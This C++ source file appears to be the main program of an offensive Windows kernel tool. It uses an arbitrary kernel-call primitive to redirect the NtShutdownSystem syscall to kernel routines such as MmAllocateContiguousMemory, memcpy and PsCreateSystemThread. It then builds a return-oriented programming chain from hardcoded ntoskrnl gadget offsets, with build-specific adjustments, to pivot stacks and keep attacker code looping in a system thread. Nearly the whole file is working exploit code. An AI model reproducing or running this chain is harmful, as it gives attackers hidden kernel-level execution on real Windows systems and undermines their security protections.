#include <include/driver/arbitrary_call.hpp>
#include <include/utils/utils.hpp>
#include <iostream>
#include <include/stack/stack_manager.hpp>

int main()
{
    if (!Utils::EnableDebugPrivilege())
    {
        std::exception("Failed to enable debug privileges");
        return EXIT_FAILURE;
    }

    const std::uintptr_t RandomValidThreadAddress = Utils::FindRandomValidThreadAddress();
    if (!RandomValidThreadAddress)
    {
        std::exception("Failed to find a random valid thread address");
        return EXIT_FAILURE;
    }

    const std::string WindowsBuild = Utils::GetWindowsDisplayVersion();
    if (WindowsBuild.empty())
    {
        std::exception("Failed to find the windows build being used");
        return EXIT_FAILURE;
    }

    std::printf("[+] Windows build: %s\n", WindowsBuild.c_str());
    std::printf("[+] New thread address to be used @ 0x%p\n", RandomValidThreadAddress);
    std::printf("[+] ntoskrnl.exe @ 0x%p\n", Driver::GetKernelModuleBase());

    Driver::ArbitraryCaller KernelCaller = Driver::ArbitraryCaller();

    const void* NtShutdownSystem = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtShutdownSystem");

    KernelCaller.RedirectCallByName("NtShutdownSystem", "MmAllocateContiguousMemory");
    void* PivotDataAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x58, (void*)MAXULONG64);
    void* DummyMemoryAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
    void* IntervalArgAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x20, (void*)MAXULONG64);
    void* CurrentStackOffsetAddress = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
    void* StackLimitStoreAddress = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
    void* StackAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x6000, (void*)MAXULONG64);
    void* OriginalStackAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x6000, (void*)MAXULONG64);
    KernelCaller.DisableRedirectByName("NtShutdownSystem");
    std::printf("[+] Stack @ 0x%p\n", StackAllocation);
    std::printf("[+] Original Stack @ 0x%p\n", OriginalStackAllocation);
    std::printf("[+] Current Stack Offset @ 0x%p\n", CurrentStackOffsetAddress);

    if (!StackAllocation || !OriginalStackAllocation || !CurrentStackOffsetAddress || !StackLimitStoreAddress || !PivotDataAllocation)
        return EXIT_FAILURE;

    // Zero out stack allocation
    KernelCaller.RedirectCallByName("NtShutdownSystem", "RtlZeroMemory");
    reinterpret_cast<void* (*)(void*, size_t)>(NtShutdownSystem)(StackAllocation, 0x6000);
    reinterpret_cast<void* (*)(void*, size_t)>(NtShutdownSystem)(OriginalStackAllocation, 0x6000);
    reinterpret_cast<void* (*)(void*, size_t)>(NtShutdownSystem)(CurrentStackOffsetAddress, 0x8);
    KernelCaller.DisableRedirectByName("NtShutdownSystem");

    StackManager KernelStackManager(Driver::GetKernelModuleBase(), reinterpret_cast<std::uintptr_t>(StackAllocation));

    // setup ropchain for our main loop
    KernelStackManager.AddFunctionCall("PsGetCurrentThread");
    KernelStackManager.AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    KernelStackManager.AddPadding(0x8);
    KernelStackManager.AddValue(0x30, "stack limit");
    KernelStackManager.AddPadding(0x10);
    KernelStackManager.AddGadget(0x263f08, "add rax, rcx; ret;");

    // rdx = stack limit store address
    KernelStackManager.AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    KernelStackManager.AddPadding(0x10);
    KernelStackManager.AddValue((std::uint64_t)StackLimitStoreAddress, "stack limit store address");
    KernelStackManager.AddPadding(0x8);

    // dereference rax, so that rax = stack limit
    KernelStackManager.AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
    KernelStackManager.AddGadget(0x432d4d, "mov qword ptr [rdx], rax; ret;");


    // move rax into rbx to preserve it
    KernelStackManager.AddGadget(0x29cc0e, "push rax; pop rbx; ret;");
    // sets rax to either 'rax + 0x2000' or 'rax + 0x4000' depending on i % 2.
    // read the value of the current stack offset global variable
    KernelStackManager.AddGadget(0xbac75b, "mov rax, qword ptr \[rsp\]; mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    KernelStackManager.AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr");
    KernelStackManager.AddPadding(0x18);
    KernelStackManager.AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
    // rcx=0
    KernelStackManager.AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    KernelStackManager.AddPadding(0x8);
    KernelStackManager.AddValue(0, "set rcx to 0");
    KernelStackManager.AddPadding(0x10);
    // move eax into ecx so we store the offset in rcx (we don't need to use full 64bits because CurrentStackOffsetAddress
    // holds a small value, either 0x2000 or 0x4000 as an offset
    KernelStackManager.AddGadget(0x212fcb, "xchg ecx, eax; ret;");
    // restore the old value of rax into rax from rbx
    KernelStackManager.AddGadget(0x56f5f2, "push rbx; pop rax; add rsp, 0x20; pop rbx; ret;");
    KernelStackManager.AddPadding(0x20 + 0x8);
    KernelStackManager.AddGadget(0x263f08, "add rax, rcx; ret;");


    // Write our own stack into thread's legitimate stack

    // r9=rax, IMPORTANT NOTE: On some windows builds this includes "add rsp, 0x28;" and on some not,
    // if yours includes it, then you must account for this in the check which decides if padding should be added
    KernelStackManager.AddGadget(0x2f3286, "mov r9, rax; mov rax, r9; (add rsp, 0x28; )?ret;");
    if (WindowsBuild == "22H2" || WindowsBuild == "23H2")
        KernelStackManager.AddPadding(0x28);

    // this gadget can either write into r8 or rdx, depending on the window version, so we will set both
    // to a valid memory dummy pool so that it writes there.
    KernelStackManager.AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    KernelStackManager.AddPadding(0x10);
    KernelStackManager.AddValue((uint64_t)DummyMemoryAllocation, "rdx = dummy pool allocation");
    KernelStackManager.AddPadding(0x8);
    KernelStackManager.AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
    KernelStackManager.AddValue((uint64_t)DummyMemoryAllocation, "r8 = dummy pool allocation");
    KernelStackManager.AddPadding(0x28);
    KernelStackManager.AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");

    KernelStackManager.AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    KernelStackManager.AddPadding(0x10);
    KernelStackManager.AddValue((std::uint64_t)OriginalStackAllocation, "src address");
    KernelStackManager.AddPadding(0x8);
    KernelStackManager.AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
    KernelStackManager.AddValue(0x2000, "count value");
    KernelStackManager.AddPadding(0x28);
    KernelStackManager.AddFunctionCall("memcpy");

    // Grab stack limit
    KernelStackManager.AddFunctionCall("PsGetCurrentThread");
    KernelStackManager.AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    KernelStackManager.AddPadding(0x8);
    KernelStackManager.AddValue(0x30, "stack limit");
    KernelStackManager.AddPadding(0x10);
    KernelStackManager.AddGadget(0x263f08, "add rax, rcx; ret;");
    // dereference rax, so that rax = stack limit
    KernelStackManager.AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");

    // get the value of the current stack offset global so we add it into rax

    // same code as above - basically just get the value of CurrentStackOffsetAddress
    // and add it to rax. so rax = stacklimit + curr_stack_offset
    KernelStackManager.AddGadget(0x29cc0e, "push rax; pop rbx; ret;");
    KernelStackManager.AddGadget(0xbac75b, "mov rax, qword ptr \[rsp\]; mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    KernelStackManager.AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr");
    KernelStackManager.AddPadding(0x18);
    KernelStackManager.AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
    KernelStackManager.AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    KernelStackManager.AddPadding(0x8);
    KernelStackManager.AddValue(0, "set rcx to 0");
    KernelStackManager.AddPadding(0x10);
    KernelStackManager.AddGadget(0x212fcb, "xchg ecx, eax; ret;");
    KernelStackManager.AddGadget(0x56f5f2, "push rbx; pop rax; add rsp, 0x20; pop rbx; ret;");
    KernelStackManager.AddPadding(0x20 + 0x8);
    KernelStackManager.AddGadget(0x263f08, "add rax, rcx; ret;");

    // same as above r9->rax->rcx, this is being stored here so we can overwrite rax for xor operation
    KernelStackManager.AddGadget(0x2f3286, "mov r9, rax; mov rax, r9; (add rsp, 0x28; )?ret;");
    if (WindowsBuild == "22H2" || WindowsBuild == "23H2")
        KernelStackManager.AddPadding(0x28);
    KernelStackManager.AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    KernelStackManager.AddPadding(0x10);
    KernelStackManager.AddValue((uint64_t)DummyMemoryAllocation, "rdx = dummy pool allocation");
    KernelStackManager.AddPadding(0x8);
    KernelStackManager.AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
    KernelStackManager.AddValue((uint64_t)DummyMemoryAllocation, "r8 = dummy pool allocation");
    KernelStackManager.AddPadding(0x28);
    KernelStackManager.AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
    // r11=rcx
    KernelStackManager.AddGadget(0xb4096a, "mov r11, rcx; mov r9d, edx; cmp edx, dword ptr [rax]; je 0x......; mov eax, 0xc000000d; ret;");

    // xor the current stack offset by global by 0x6000 (0x2000 ^ 0x4000 = 0x6000),
    // meaning we will always swap between 0x2000 and 0x4000 per iteration.
    KernelStackManager.AddGadget(0xbac75b, "mov rax, qword ptr \[rsp\]; mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    KernelStackManager.AddValue(0x6000, "xor key (0x6000)");
    KernelStackManager.AddPadding(0x18);
    KernelStackManager.AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    KernelStackManager.AddPadding(0x10);
    KernelStackManager.AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr (to xor)");
    KernelStackManager.AddPadding(0x8);
    KernelStackManager.AddGadget(0x43d5e8, "xor qword ptr [rdx], rax; ret;");

    // perform pivot, rsp=r11
    KernelStackManager.AddGadget(0x533eda, "mov rsp, r11; ret;");


    LARGE_INTEGER SleepInterval;
    SleepInterval.QuadPart = -10000000;

    std::uint64_t CurrentStackOffsetStartValue = 0x2000;

    void* PivotJumpAddress = (void*)(Driver::GetKernelModuleBase() + 0x20043b);
    void* NewRspAddress = (void*)((uint64_t)StackAllocation + 0x2000);

    KernelCaller.RedirectCallByName("NtShutdownSystem", "memcpy");
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uint64_t)PivotDataAllocation + 0x50), &PivotJumpAddress, sizeof(PivotJumpAddress));
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uint64_t)PivotDataAllocation + 0x10), &NewRspAddress, sizeof(NewRspAddress));
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(IntervalArgAllocation, &SleepInterval, sizeof(SleepInterval));
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(CurrentStackOffsetAddress, &CurrentStackOffsetStartValue, sizeof(CurrentStackOffsetStartValue));
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 0x2000), KernelStackManager.GetStackBuffer(), KernelStackManager.GetStackSize());
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(OriginalStackAllocation, KernelStackManager.GetStackBuffer(), KernelStackManager.GetStackSize());
    KernelCaller.DisableRedirectByName("NtShutdownSystem");

    Sleep(500);
    std::cin.get();

    // mov rdx, qword ptr [rcx + 0x50]; mov rbp, qword ptr [rcx + 0x18]; mov rsp, qword ptr [rcx + 0x10]; jmp rdx;
    void* BootstrapGadget = (void*)(Driver::GetKernelModuleBase() + 0x698bd0);

    HANDLE KernelThreadHandle;
    KernelCaller.RedirectCallByName("NtShutdownSystem", "PsCreateSystemThread", (void*)NULL, (void*)BootstrapGadget, PivotDataAllocation);
    NTSTATUS ThreadCreation = reinterpret_cast<NTSTATUS(*)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, HANDLE)>(NtShutdownSystem)(
        &KernelThreadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        NULL
    );
    KernelCaller.DisableRedirectByName("NtShutdownSystem");

    KernelCaller.RedirectCallByName("NtShutdownSystem", "ZwClose");
    reinterpret_cast<void* (*)(HANDLE)>(NtShutdownSystem)(KernelThreadHandle);
    KernelCaller.DisableRedirectByName("NtShutdownSystem");

    return EXIT_SUCCESS;
}